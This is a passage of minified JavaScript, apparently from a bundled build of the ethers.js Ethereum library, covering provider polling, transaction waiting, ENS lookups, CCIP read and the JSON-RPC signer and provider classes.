${l}`,we.errors.SERVER_ERROR,{url:t,errorMessage:l});o.push(l)}return Ht.throwError(`error encountered during CCIP fetch: ${o.map((e=>JSON.stringify(e))).join(", ")}`,we.errors.SERVER_ERROR,{urls:r,errorMessages:o})}))}_getInternalBlockNumber(e){return At(this,void 0,void 0,(function*(){if(yield this._ready(),e>0)for(;this._internalBlockNumber;){const t=this._internalBlockNumber;try{const r=yield t;if(ld()-r.respTime<=e)return r.blockNumber;break}catch{if(this._internalBlockNumber===t)break}}const t=ld(),r=Fn({blockNumber:this.perform("getBlockNumber",{}),networkError:this.getNetwork().then((e=>null),(e=>e))}).then((({blockNumber:e,networkError:n})=>{if(n)throw this._internalBlockNumber===r&&(this._internalBlockNumber=null),n;const i=ld();return(e=Ke.from(e).toNumber())<this._maxInternalBlockNumber&&(e=this._maxInternalBlockNumber),this._maxInternalBlockNumber=e,this._setFastBlockNumber(e),{blockNumber:e,reqTime:t,respTime:i}}));return this._internalBlockNumber=r,r.catch((e=>{this._internalBlockNumber===r&&(this._internalBlockNumber=null)})),(yield r).blockNumber}))}poll(){return At(this,void 0,void 0,(function*(){const e=jte++,t=[];let r=null;try{r=yield this._getInternalBlockNumber(100+this.pollingInterval/2)}catch(e){return void this.emit("error",e)}if(this._setFastBlockNumber(r),this.emit("poll",e,r),r!==this._lastBlockNumber){if(-2===this._emitted.block&&(this._emitted.block=r-1),Math.abs(this._emitted.block-r)>1e3)Ht.warn(`network block skew detected; skipping block events (emitted=${this._emitted.block} blockNumber${r})`),this.emit("error",Ht.makeError("network block skew detected",we.errors.NETWORK_ERROR,{blockNumber:r,event:"blockSkew",previousBlockNumber:this._emitted.block})),this.emit("block",r);else for(let e=this._emitted.block+1;e<=r;e++)this.emit("block",e);this._emitted.block!==r&&(this._emitted.block=r,Object.keys(this._emitted).forEach((e=>{if("block"===e)return;const t=this._emitted[e];"pending"!==t&&r-t>12&&delete this._emitted[e]}))),-2===this._lastBlockNumber&&(this._lastBlockNumber=r-1),this._events.forEach((e=>{switch(e.type){case"tx":{const r=e.hash;let n=this.getTransactionReceipt(r).then((e=>(!e||null==e.blockNumber||(this._emitted["t:"+r]=e.blockNumber,this.emit(r,e)),null))).catch((e=>{this.emit("error",e)}));t.push(n);break}case"filter":if(!e._inflight){e._inflight=!0,-2===e._lastBlockNumber&&(e._lastBlockNumber=r-1);const n=e.filter;n.fromBlock=e._lastBlockNumber+1,n.toBlock=r;const i=n.toBlock-this._maxFilterBlockRange;i>n.fromBlock&&(n.fromBlock=i),n.fromBlock<0&&(n.fromBlock=0);const o=this.getLogs(n).then((t=>{e._inflight=!1,0!==t.length&&t.forEach((t=>{t.blockNumber>e._lastBlockNumber&&(e._lastBlockNumber=t.blockNumber),this._emitted["b:"+t.blockHash]=t.blockNumber,this._emitted["t:"+t.transactionHash]=t.blockNumber,this.emit(n,t)}))})).catch((t=>{this.emit("error",t),e._inflight=!1}));t.push(o)}}})),this._lastBlockNumber=r,Promise.all(t).then((()=>{this.emit("didPoll",e)})).catch((e=>{this.emit("error",e)}))}else this.emit("didPoll",e)}))}resetEventsBlock(e){this._lastBlockNumber=e-1,this.polling&&this.poll()}get network(){return this._network}detectNetwork(){return At(this,void 0,void 0,(function*(){return Ht.throwError("provider does not support network detection",we.errors.UNSUPPORTED_OPERATION,{operation:"provider.detectNetwork"})}))}getNetwork(){return At(this,void 0,void 0,(function*(){const e=yield this._ready(),t=yield this.detectNetwork();return e.chainId!==t.chainId&&this.anyNetwork?(this._network=t,this._lastBlockNumber=-2,this._fastBlockNumber=null,this._fastBlockNumberPromise=null,this._fastQueryDate=0,this._emitted.block=-2,this._maxInternalBlockNumber=-1024,this._internalBlockNumber=null,this.emit("network",t,e),yield B8(0),this._network):e}))}get blockNumber(){return this._getInternalBlockNumber(100+this.pollingInterval/2).then((e=>{this._setFastBlockNumber(e)}),(e=>{})),null!=this._fastBlockNumber?this._fastBlockNumber:-1}get polling(){return null!=this._poller}set polling(e){e&&!this._poller?(this._poller=setInterval((()=>{this.poll()}),this.pollingInterval),this._bootstrapPoll||(this._bootstrapPoll=setTimeout((()=>{this.poll(),this._bootstrapPoll=setTimeout((()=>{this._poller||this.poll(),this._bootstrapPoll=null}),this.pollingInterval)}),0))):!e&&this._poller&&(clearInterval(this._poller),this._poller=null)}get pollingInterval(){return this._pollingInterval}set pollingInterval(e){if("number"!=typeof e||e<=0||parseInt(String(e))!=e)throw new Error("invalid polling interval");this._pollingInterval=e,this._poller&&(clearInterval(this._poller),this._poller=setInterval((()=>{this.poll()}),this._pollingInterval))}_getFastBlockNumber(){const e=ld();return e-this._fastQueryDate>2*this._pollingInterval&&(this._fastQueryDate=e,this._fastBlockNumberPromise=this.getBlockNumber().then((e=>((null==this._fastBlockNumber||e>this._fastBlockNumber)&&(this._fastBlockNumber=e),this._fastBlockNumber)))),this._fastBlockNumberPromise}_setFastBlockNumber(e){null!=this._fastBlockNumber&&e<this._fastBlockNumber||(this._fastQueryDate=ld(),(null==this._fastBlockNumber||e>this._fastBlockNumber)&&(this._fastBlockNumber=e,this._fastBlockNumberPromise=Promise.resolve(e)))}waitForTransaction(e,t,r){return At(this,void 0,void 0,(function*(){return this._waitForTransaction(e,t??1,r||0,null)}))}_waitForTransaction(e,t,r,n){return At(this,void 0,void 0,(function*(){const i=yield this.getTransactionReceipt(e);return(i?i.confirmations:0)>=t?i:new Promise(((i,o)=>{const s=[];let a=!1;const c=function(){return!!a||(a=!0,s.forEach((e=>{e()})),!1)},l=e=>{e.confirmations<t||c()||i(e)};if(this.on(e,l),s.push((()=>{this.removeListener(e,l)})),n){let r=n.startBlock,i=null;const l=s=>At(this,void 0,void 0,(function*(){a||(yield B8(1e3),this.getTransactionCount(n.from).then((u=>At(this,void 0,void 0,(function*(){if(!a){if(u<=n.nonce)r=s;else{{const t=yield this.getTransaction(e);if(t&&null!=t.blockNumber)return}for(null==i&&(i=r-3,i<n.startBlock&&(i=n.startBlock));i<=s;){if(a)return;const r=yield this.getBlockWithTransactions(i);for(let i=0;i<r.transactions.length;i++){const s=r.transactions[i];if(s.hash===e)return;if(s.from===n.from&&s.nonce===n.nonce){if(a)return;const r=yield this.waitForTransaction(s.hash,t);if(c())return;let i="replaced";return s.data===n.data&&s.to===n.to&&s.value.eq(n.value)?i="repriced":"0x"===s.data&&s.from===s.to&&s.value.isZero()&&(i="cancelled"),void o(Ht.makeError("transaction was replaced",we.errors.TRANSACTION_REPLACED,{cancelled:"replaced"===i||"cancelled"===i,reason:i,replacement:this._wrapTransaction(s),hash:e,receipt:r}))}}i++}}a||this.once("block",l)}}))),(e=>{a||this.once("block",l)})))}));if(a)return;this.once("block",l),s.push((()=>{this.removeListener("block",l)}))}if("number"==typeof r&&r>0){const e=setTimeout((()=>{c()||o(Ht.makeError("timeout exceeded",we.errors.TIMEOUT,{timeout:r}))}),r);e.unref&&e.unref(),s.push((()=>{clearTimeout(e)}))}}))}))}getBlockNumber(){return At(this,void 0,void 0,(function*(){return this._getInternalBlockNumber(0)}))}getGasPrice(){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const e=yield this.perform("getGasPrice",{});try{return Ke.from(e)}catch(t){return Ht.throwError("bad result from backend",we.errors.SERVER_ERROR,{method:"getGasPrice",result:e,error:t})}}))}getBalance(e,t){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const r=yield Fn({address:this._getAddress(e),blockTag:this._getBlockTag(t)}),n=yield this.perform("getBalance",r);try{return Ke.from(n)}catch(e){return Ht.throwError("bad result from backend",we.errors.SERVER_ERROR,{method:"getBalance",params:r,result:n,error:e})}}))}getTransactionCount(e,t){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const r=yield Fn({address:this._getAddress(e),blockTag:this._getBlockTag(t)}),n=yield this.perform("getTransactionCount",r);try{return Ke.from(n).toNumber()}catch(e){return Ht.throwError("bad result from backend",we.errors.SERVER_ERROR,{method:"getTransactionCount",params:r,result:n,error:e})}}))}getCode(e,t){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const r=yield Fn({address:this._getAddress(e),blockTag:this._getBlockTag(t)}),n=yield this.perform("getCode",r);try{return kt(n)}catch(e){return Ht.throwError("bad result from backend",we.errors.SERVER_ERROR,{method:"getCode",params:r,result:n,error:e})}}))}getStorageAt(e,t,r){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const n=yield Fn({address:this._getAddress(e),blockTag:this._getBlockTag(r),position:Promise.resolve(t).then((e=>u_(e)))}),i=yield this.perform("getStorageAt",n);try{return kt(i)}catch(e){return Ht.throwError("bad result from backend",we.errors.SERVER_ERROR,{method:"getStorageAt",params:n,result:i,error:e})}}))}_wrapTransaction(e,t,r){if(null!=t&&32!==Vl(t))throw new Error("invalid response - sendTransaction");const n=e;return null!=t&&e.hash!==t&&Ht.throwError("Transaction hash mismatch from Provider.sendTransaction.",we.errors.UNKNOWN_ERROR,{expectedHash:e.hash,returnedHash:t}),n.wait=(t,n)=>At(this,void 0,void 0,(function*(){let i;null==t&&(t=1),null==n&&(n=0),0!==t&&null!=r&&(i={data:e.data,from:e.from,nonce:e.nonce,to:e.to,value:e.value,startBlock:r});const o=yield this._waitForTransaction(e.hash,t,n,i);return null==o&&0===t?null:(this._emitted["t:"+e.hash]=o.blockNumber,0===o.status&&Ht.throwError("transaction failed",we.errors.CALL_EXCEPTION,{transactionHash:e.hash,transaction:e,receipt:o}),o)})),n}sendTransaction(e){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const t=yield Promise.resolve(e).then((e=>kt(e))),r=this.formatter.transaction(e);null==r.confirmations&&(r.confirmations=0);const n=yield this._getInternalBlockNumber(100+2*this.pollingInterval);try{const e=yield this.perform("sendTransaction",{signedTransaction:t});return this._wrapTransaction(r,e,n)}catch(e){throw e.transaction=r,e.transactionHash=r.hash,e}}))}_getTransactionRequest(e){return At(this,void 0,void 0,(function*(){const t=yield e,r={};return["from","to"].forEach((e=>{null!=t[e]&&(r[e]=Promise.resolve(t[e]).then((e=>e?this._getAddress(e):null)))})),["gasLimit","gasPrice","maxFeePerGas","maxPriorityFeePerGas","value"].forEach((e=>{null!=t[e]&&(r[e]=Promise.resolve(t[e]).then((e=>e?Ke.from(e):null)))})),["type"].forEach((e=>{null!=t[e]&&(r[e]=Promise.resolve(t[e]).then((e=>e??null)))})),t.accessList&&(r.accessList=this.formatter.accessList(t.accessList)),["data"].forEach((e=>{null!=t[e]&&(r[e]=Promise.resolve(t[e]).then((e=>e?kt(e):null)))})),this.formatter.transactionRequest(yield Fn(r))}))}_getFilter(e){return At(this,void 0,void 0,(function*(){e=yield e;const t={};return null!=e.address&&(t.address=this._getAddress(e.address)),["blockHash","topics"].forEach((r=>{null!=e[r]&&(t[r]=e[r])})),["fromBlock","toBlock"].forEach((r=>{null!=e[r]&&(t[r]=this._getBlockTag(e[r]))})),this.formatter.filter(yield Fn(t))}))}_call(e,t,r){return At(this,void 0,void 0,(function*(){r>=10&&Ht.throwError("CCIP read exceeded maximum redirections",we.errors.SERVER_ERROR,{redirects:r,transaction:e});const n=e.to,i=yield this.perform("call",{transaction:e,blockTag:t});if(r>=0&&"latest"===t&&null!=n&&"0x556f1830"===i.substring(0,10)&&Vl(i)%32==4)try{const o=mi(i,4),s=mi(o,0,32);Ke.from(s).eq(n)||Ht.throwError("CCIP Read sender did not match",we.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:i});const a=[],c=Ke.from(mi(o,32,64)).toNumber(),l=Ke.from(mi(o,c,c+32)).toNumber(),u=mi(o,c+32);for(let t=0;t<l;t++){const r=ig(u,32*t);null==r&&Ht.throwError("CCIP Read contained corrupt URL string",we.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:i}),a.push(r)}const h=h0(o,64);Ke.from(mi(o,100,128)).isZero()||Ht.throwError("CCIP Read callback selector included junk",we.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:i});const d=mi(o,96,100),f=h0(o,128),p=yield this.ccipReadFetch(e,h,a);null==p&&Ht.throwError("CCIP Read disabled or provided no URLs",we.errors.CALL_EXCEPTION,{name:"OffchainLookup",signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",transaction:e,data:i});const g={to:n,data:ss([d,H7([p,f])])};return this._call(g,t,r+1)}catch(e){if(e.code===we.errors.SERVER_ERROR)throw e}try{return kt(i)}catch(r){return Ht.throwError("bad result from backend",we.errors.SERVER_ERROR,{method:"call",params:{transaction:e,blockTag:t},result:i,error:r})}}))}call(e,t){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const r=yield Fn({transaction:this._getTransactionRequest(e),blockTag:this._getBlockTag(t),ccipReadEnabled:Promise.resolve(e.ccipReadEnabled)});return this._call(r.transaction,r.blockTag,r.ccipReadEnabled?0:-1)}))}estimateGas(e){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const t=yield Fn({transaction:this._getTransactionRequest(e)}),r=yield this.perform("estimateGas",t);try{return Ke.from(r)}catch(e){return Ht.throwError("bad result from backend",we.errors.SERVER_ERROR,{method:"estimateGas",params:t,result:r,error:e})}}))}_getAddress(e){return At(this,void 0,void 0,(function*(){"string"!=typeof(e=yield e)&&Ht.throwArgumentError("invalid address or ENS name","name",e);const t=yield this.resolveName(e);return null==t&&Ht.throwError("ENS name not configured",we.errors.UNSUPPORTED_OPERATION,{operation:`resolveName(${JSON.stringify(e)})`}),t}))}_getBlock(e,t){return At(this,void 0,void 0,(function*(){yield this.getNetwork(),e=yield e;let r=-128;const n={includeTransactions:!!t};if(Nr(e,32))n.blockHash=e;else try{n.blockTag=yield this._getBlockTag(e),Nr(n.blockTag)&&(r=parseInt(n.blockTag.substring(2),16))}catch{Ht.throwArgumentError("invalid block hash or block tag","blockHashOrBlockTag",e)}return xd((()=>At(this,void 0,void 0,(function*(){const e=yield this.perform("getBlock",n);if(null==e)return null!=n.blockHash&&null==this._emitted["b:"+n.blockHash]||null!=n.blockTag&&r>this._emitted.block?null:void 0;if(t){let t=null;for(let r=0;r<e.transactions.length;r++){const n=e.transactions[r];if(null==n.blockNumber)n.confirmations=0;else if(null==n.confirmations){null==t&&(t=yield this._getInternalBlockNumber(100+2*this.pollingInterval));let e=t-n.blockNumber+1;e<=0&&(e=1),n.confirmations=e}}const r=this.formatter.blockWithTransactions(e);return r.transactions=r.transactions.map((e=>this._wrapTransaction(e))),r}return this.formatter.block(e)}))),{oncePoll:this})}))}getBlock(e){return this._getBlock(e,!1)}getBlockWithTransactions(e){return this._getBlock(e,!0)}getTransaction(e){return At(this,void 0,void 0,(function*(){yield this.getNetwork(),e=yield e;const t={transactionHash:this.formatter.hash(e,!0)};return xd((()=>At(this,void 0,void 0,(function*(){const r=yield this.perform("getTransaction",t);if(null==r)return null==this._emitted["t:"+e]?null:void 0;const n=this.formatter.transactionResponse(r);if(null==n.blockNumber)n.confirmations=0;else if(null==n.confirmations){let e=(yield this._getInternalBlockNumber(100+2*this.pollingInterval))-n.blockNumber+1;e<=0&&(e=1),n.confirmations=e}return this._wrapTransaction(n)}))),{oncePoll:this})}))}getTransactionReceipt(e){return At(this,void 0,void 0,(function*(){yield this.getNetwork(),e=yield e;const t={transactionHash:this.formatter.hash(e,!0)};return xd((()=>At(this,void 0,void 0,(function*(){const r=yield this.perform("getTransactionReceipt",t);if(null==r)return null==this._emitted["t:"+e]?null:void 0;if(null==r.blockHash)return;const n=this.formatter.receipt(r);if(null==n.blockNumber)n.confirmations=0;else if(null==n.confirmations){let e=(yield this._getInternalBlockNumber(100+2*this.pollingInterval))-n.blockNumber+1;e<=0&&(e=1),n.confirmations=e}return n}))),{oncePoll:this})}))}getLogs(e){return At(this,void 0,void 0,(function*(){yield this.getNetwork();const t=yield Fn({filter:this._getFilter(e)}),r=yield this.perform("getLogs",t);return r.forEach((e=>{null==e.removed&&(e.removed=!1)})),Ye.arrayOf(this.formatter.filterLog.bind(this.formatter))(r)}))}getEtherPrice(){return At(this,void 0,void 0,(function*(){return yield this.getNetwork(),this.perform("getEtherPrice",{})}))}_getBlockTag(e){return At(this,void 0,void 0,(function*(){if("number"==typeof(e=yield e)&&e<0){e%1&&Ht.throwArgumentError("invalid BlockTag","blockTag",e);let t=yield this._getInternalBlockNumber(100+2*this.pollingInterval);return t+=e,t<0&&(t=0),this.formatter.blockTag(t)}return this.formatter.blockTag(e)}))}getResolver(e){return At(this,void 0,void 0,(function*(){let t=e;for(;;){if(""===t||"."===t||"eth"!==e&&"eth"===t)return null;const r=yield this._getResolver(t,"getResolver");if(null!=r){const n=new W8(this,r,e);return t===e||(yield n.supportsWildcard())?n:null}t=t.split(".").slice(1).join(".")}}))}_getResolver(e,t){return At(this,void 0,void 0,(function*(){null==t&&(t="ENS");const r=yield this.getNetwork();r.ensAddress||Ht.throwError("network does not support ENS",we.errors.UNSUPPORTED_OPERATION,{operation:t,network:r.name});try{const t=yield this.call({to:r.ensAddress,data:"0x0178b8bf"+tg(e).substring(2)});return this.formatter.callAddress(t)}catch{}return null}))}resolveName(e){return At(this,void 0,void 0,(function*(){e=yield e;try{return Promise.resolve(this.formatter.address(e))}catch(t){if(Nr(e))throw t}"string"!=typeof e&&Ht.throwArgumentError("invalid ENS name","name",e);const t=yield this.getResolver(e);return t?yield t.getAddress():null}))}lookupAddress(e){return At(this,void 0,void 0,(function*(){e=yield e;const t=(e=this.formatter.address(e)).substring(2).toLowerCase()+".addr.reverse",r=yield this._getResolver(t,"lookupAddress");if(null==r)return null;const n=ig(yield this.call({to:r,data:"0x691f3431"+tg(t).substring(2)}),0);return(yield this.resolveName(n))!=e?null:n}))}getAvatar(e){return At(this,void 0,void 0,(function*(){let t=null;if(Nr(e)){const r=this.formatter.address(e).substring(2).toLowerCase()+".addr.reverse",n=yield this._getResolver(r,"getAvatar");if(!n)return null;t=new W8(this,n,r);try{const e=yield t.getAvatar();if(e)return e.url}catch(e){if(e.code!==we.errors.CALL_EXCEPTION)throw e}try{const e=ig(yield this.call({to:n,data:"0x691f3431"+tg(r).substring(2)}),0);t=yield this.getResolver(e)}catch(e){if(e.code!==we.errors.CALL_EXCEPTION)throw e;return null}}else if(t=yield this.getResolver(e),!t)return null;const r=yield t.getAvatar();return null==r?null:r.url}))}perform(e,t){return Ht.throwError(e+" not implemented",we.errors.NOT_IMPLEMENTED,{operation:e})}_startEvent(e){this.polling=this._events.filter((e=>e.pollable())).length>0}_stopEvent(e){this.polling=this._events.filter((e=>e.pollable())).length>0}_addEventListener(e,t,r){const n=new Lte(Uu(e),t,r);return this._events.push(n),this._startEvent(n),this}on(e,t){return this._addEventListener(e,t,!1)}once(e,t){return this._addEventListener(e,t,!0)}emit(e,...t){let r=!1,n=[],i=Uu(e);return this._events=this._events.filter((e=>e.tag!==i||(setTimeout((()=>{e.listener.apply(this,t)}),0),r=!0,!e.once||(n.push(e),!1)))),n.forEach((e=>{this._stopEvent(e)})),r}listenerCount(e){if(!e)return this._events.length;let t=Uu(e);return this._events.filter((e=>e.tag===t)).length}listeners(e){if(null==e)return this._events.map((e=>e.listener));let t=Uu(e);return this._events.filter((e=>e.tag===t)).map((e=>e.listener))}off(e,t){if(null==t)return this.removeAllListeners(e);const r=[];let n=!1,i=Uu(e);return this._events=this._events.filter((e=>!(e.tag===i&&e.listener==t&&!n)||(n=!0,r.push(e),!1))),r.forEach((e=>{this._stopEvent(e)})),this}removeAllListeners(e){let t=[];if(null==e)t=this._events,this._events=[];else{const r=Uu(e);this._events=this._events.filter((e=>e.tag!==r||(t.push(e),!1)))}return t.forEach((e=>{this._stopEvent(e)})),this}}var Na=globalThis&&globalThis.__awaiter||function(e,t,r,n){return new(r||(r=Promise))((function(i,o){function s(e){try{c(n.next(e))}catch(e){o(e)}}function a(e){try{c(n.throw(e))}catch(e){o(e)}}function c(e){e.done?i(e.value):function(e){return e instanceof r?e:new r((function(t){t(e)}))}(e.value).then(s,a)}c((n=n.apply(e,t||[])).next())}))};const hn=new we(Zc),Wte=["call","estimateGas"];function kd(e,t){if(null==e)return null;if("string"==typeof e.message&&e.message.match("reverted")){const r=Nr(e.data)?e.data:null;if(!t||r)return{message:e.message,data:r}}if("object"==typeof e){for(const r in e){const n=kd(e[r],t);if(n)return n}return null}if("string"==typeof e)try{return kd(JSON.parse(e),t)}catch{}return null}function q7(e,t,r){const n=r.transaction||r.signedTransaction;if("call"===e){const e=kd(t,!0);if(e)return e.data;hn.throwError("missing revert data in call exception; Transaction reverted without a reason string",we.errors.CALL_EXCEPTION,{data:"0x",transaction:n,error:t})}if("estimateGas"===e){let r=kd(t.body,!1);null==r&&(r=kd(t,!1)),r&&hn.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",we.errors.UNPREDICTABLE_GAS_LIMIT,{reason:r.message,method:e,transaction:n,error:t})}let i=t.message;throw t.code===we.errors.SERVER_ERROR&&t.error&&"string"==typeof t.error.message?i=t.error.message:"string"==typeof t.body?i=t.body:"string"==typeof t.responseText&&(i=t.responseText),i=(i||"").toLowerCase(),i.match(/insufficient funds|base fee exceeds gas limit|InsufficientFunds/i)&&hn.throwError("insufficient funds for intrinsic transaction cost",we.errors.INSUFFICIENT_FUNDS,{error:t,method:e,transaction:n}),i.match(/nonce (is )?too low/i)&&hn.throwError("nonce has already been used",we.errors.NONCE_EXPIRED,{error:t,method:e,transaction:n}),i.match(/replacement transaction underpriced|transaction gas price.*too low/i)&&hn.throwError("replacement fee too low",we.errors.REPLACEMENT_UNDERPRICED,{error:t,method:e,transaction:n}),i.match(/only replay-protected/i)&&hn.throwError("legacy pre-eip-155 transactions not supported",we.errors.UNSUPPORTED_OPERATION,{error:t,method:e,transaction:n}),Wte.indexOf(e)>=0&&i.match(/gas required exceeds allowance|always failing transaction|execution reverted|revert/)&&hn.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",we.errors.UNPREDICTABLE_GAS_LIMIT,{error:t,method:e,transaction:n}),t}function z8(e){return new Promise((function(t){setTimeout(t,e)}))}function zte(e){if(e.error){const t=new Error(e.error.message);throw t.code=e.error.code,t.data=e.error.data,t}return e.result}function ud(e){return e&&e.toLowerCase()}const W2={};class V7 extends g_{constructor(e,t,r){if(super(),e!==W2)throw new Error("do not call the JsonRpcSigner constructor directly; use provider.getSigner");_t(this,"provider",t),null==r&&(r=0),"string"==typeof r?(_t(this,"_address",this.provider.formatter.address(r)),_t(this,"_index",null)):"number"==typeof r?(_t(this,"_index",r),_t(this,"_address",null)):hn.throwArgumentError("invalid address or index","addressOrIndex",r)}connect(e){return hn.throwError("cannot alter JSON-RPC Signer connection",we.errors.UNSUPPORTED_OPERATION,{operation:"connect"})}connectUnchecked(){return new Hte(W2,this.provider,this._address||this._index)}getAddress(){return this._address?Promise.resolve(this._address):this.provider.send("eth_accounts",[]).then((e=>(e.length<=this._index&&hn.throwError("unknown account #"+this._index,we.errors.UNSUPPORTED_OPERATION,{operation:"getAddress"}),this.provider.formatter.address(e[this._index]))))}sendUncheckedTransaction(e){e=Wi(e);const t=this.getAddress().then((e=>(e&&(e=e.toLowerCase()),e)));if(null==e.gasLimit){const r=Wi(e);r.from=t,e.gasLimit=this.provider.estimateGas(r)}return null!=e.to&&(e.to=Promise.resolve(e.to).then((e=>Na(this,void 0,void 0,(function*(){if(null==e)return null;const t=yield this.provider.resolveName(e);return null==t&&hn.throwArgumentError("provided ENS name resolves to null","tx.to",e),t}))))),Fn({tx:Fn(e),sender:t}).then((({tx:t,sender:r})=>{null!=t.from?t.from.toLowerCase()!==r&&hn.throwArgumentError("from address mismatch","transaction",e):t.from=r;const n=this.provider.constructor.hexlifyTransaction(t,{from:!0});return this.provider.send("eth_sendTransaction",[n]).then((e=>e),(e=>("string"==typeof e.message&&e.message.match(/user denied/i)&&hn.throwError("user rejected transaction",we.errors.ACTION_REJECTED,{action:"sendTransaction",transaction:t}),q7("sendTransaction",e,n))))}))}signTransaction(e){return hn.throwError("signing transactions is unsupported",we.errors.UNSUPPORTED_OPERATION,{operation:"signTransaction"})}sendTransaction(e){return Na(this,void 0,void 0,(function*(){const t=yield this.provider._getInternalBlockNumber(100+2*this.provider.pollingInterval),r=yield this.sendUncheckedTransaction(e);try{return yield xd((()=>Na(this,void 0,void 0,(function*(){const e=yield this.provider.getTransaction(r);if(null!==e)return this.provider._wrapTransaction(e,r,t)}))),{oncePoll:this.provider})}catch(e){throw e.transactionHash=r,e}}))}signMessage(e){return Na(this,void 0,void 0,(function*(){const t="string"==typeof e?ja(e):e,r=yield this.getAddress();try{return yield this.provider.send("personal_sign",[kt(t),r.toLowerCase()])}catch(t){throw"string"==typeof t.message&&t.message.match(/user denied/i)&&hn.throwError("user rejected signing",we.errors.ACTION_REJECTED,{action:"signMessage",from:r,messageData:e}),t}}))}_legacySignMessage(e){return Na(this,void 0,void 0,(function*(){const t="string"==typeof e?ja(e):e,r=yield this.getAddress();try{return yield this.provider.send("eth_sign",[r.toLowerCase(),kt(t)])}catch(t){throw"string"==typeof t.message&&t.message.match(/user denied/i)&&hn.throwError("user rejected signing",we.errors.ACTION_REJECTED,{action:"_legacySignMessage",from:r,messageData:e}),t}}))}_signTypedData(e,t,r){return Na(this,void 0,void 0,(function*(){const n=yield rs.resolveNames(e,t,r,(e=>this.provider.resolveName(e))),i=yield this.getAddress();try{return yield this.provider.send("eth_signTypedData_v4",[i.toLowerCase(),JSON.stringify(rs.getPayload(n.domain,t,n.value))])}catch(e){throw"string"==typeof e.message&&e.message.match(/user denied/i)&&hn.throwError("user rejected signing",we.errors.ACTION_REJECTED,{action:"_signTypedData",from:i,messageData:{domain:n.domain,types:t,value:n.value}}),e}}))}unlock(e){return Na(this,void 0,void 0,(function*(){const t=this.provider,r=yield this.getAddress();return t.send("personal_unlockAccount",[r.toLowerCase(),e,null])}))}}class Hte extends V7{sendTransaction(e){return this.sendUncheckedTransaction(e).then((e=>({hash:e,nonce:null,gasLimit:null,gasPrice:null,data:null,value:null,chainId:null,confirmations:0,from:null,wait:t=>this.provider.waitForTransaction(e,t)})))}}const qte={chainId:!0,data:!0,gasLimit:!0,gasPrice:!0,nonce:!0,to:!0,value:!0,type:!0,accessList:!0,maxFeePerGas:!0,maxPriorityFeePerGas:!0};class Vv extends Ute{constructor(e,t){let r=t;null==r&&(r=new Promise(((e,t)=>{setTimeout((()=>{this.detectNetwork().then((t=>{e(t)}),(e=>{t(e)}))}),0)}))),super(r),e||(e=Ec(this.constructor,"defaultUrl")()),_t(this,"connection","string"==typeof e?Object.freeze({url:e}):Object.freeze(Wi(e))),this._nextId=42}get _cache(){return null==this._eventLoopCache&&(this._eventLoopCache={}),this._eventLoopCache}static defaultUrl(){return"http://localhost:8545"}detectNetwork(){return this._cache.detectNetwork||(this._cache.detectNetwork=this._uncachedDetectNetwork(),setTimeout((()=>{this._cache.detectNetwork=null}),0)),this._cache.detectNetwork}_uncachedDetectNetwork(){return Na(this,void 0,void 0,(function*(){yield z8(0);let e=null;try{e=yield this.send("eth_chainId",[])}catch{try{e=yield this.send("net_version",[])}catch{}}if(null!=e){const t=Ec(this.constructor,"getNetwork");try{return t(Ke.from(e).toNumber())}catch(t){return hn.throwError("could not detect network",we.errors.NETWORK_ERROR,{chainId:e,event:"invalidNetwork",serverError:t})}}return hn.throwError("could not detect network",we.errors.NETWORK_ERROR,{event:"noNetwork"})}))}getSigner(e){return new V7(W2,this,e)}getUncheckedSigner(e){return this.getSigner(e).connectUnchecked()}listAccounts(){return this.send("eth_accounts",[]).then((e=>e.map((e=>this.formatter.address(e)))))}send(e,t){const r={method:e,params:t,id:this._nextId++,jsonrpc:"2.0"};this.emit("debug",{action:"request",request:Gl(r),provider:this});const n=["eth_chainId","eth_blockNumber"].indexOf(e)>=0;if(n&&this._cache[e])return this._cache[e];const i=y_(this.connection,JSON.stringify(r),zte).then((e=>(this.emit("debug",{action:"response",request:r,response:e,provider:this}),e)),(e=>{throw this.emit("debug",{action:"response",error:e,request:r,provider:this}),e}));return n&&(this._cache[e]=i,setTimeout((()=>{this._cache[e]=null}),0)),i}prepareRequest(e,t){switch(e){case"getBlockNumber":return["eth_blockNumber",[]];case"getGasPrice":return["eth_gasPrice",[]];case"getBalance":return["eth_getBalance",[ud(t.address),t.blockTag]];case"getTransactionCount":return["eth_getTransactionCount",[ud(t.address),t.blockTag]];case"getCode":return["eth_getCode",[ud(t.address),t.blockTag]];case"getStorageAt":return["eth_getStorageAt",[ud(t.address),Jr(t.position,32),t.blockTag]];case"sendTransaction":return["eth_sendRawTransaction",[t.signedTransaction]];case"getBlock":return t.blockTag?["eth_getBlockByNumber",[t.blockTag,!!t.includeTransactions]]:t.blockHash?["eth_getBlockByHash",[t.blockHash,!!t.includeTransactions]]:null;case"getTransaction":return["eth_getTransactionByHash",[t.transactionHash]];case"getTransactionReceipt":return["eth_getTransactionReceipt",[t.transactionHash]];case"call":return["eth_call",[Ec(this.constructor,"hexlifyTransaction")(t.transaction,{from:!0}),t.blockTag]];case"estimateGas":return["eth_estimateGas",[Ec(this.constructor,"hexlifyTransaction")(t.transaction,{from:!0})]];case"getLogs":return t.filter&&null!=t.filter.address&&(t.filter.address=ud(t.filter.address)),["eth_getLogs",[t.filter]]}return null}perform(e,t){return Na(this,void 0,void 0,(function*(){if("call"===e||"estimateGas"===e){const e=t.transaction;if(e&&null!=e.type&&Ke.from(e.type).isZero()&&null==e.maxFeePerGas&&null==e.maxPriorityFeePerGas){const r=yield this.getFeeData();null==r.maxFeePerGas&&null==r.maxPriorityFeePerGas&&((t=Wi(t)).transaction=Wi(e),delete t.transaction.type)}}const 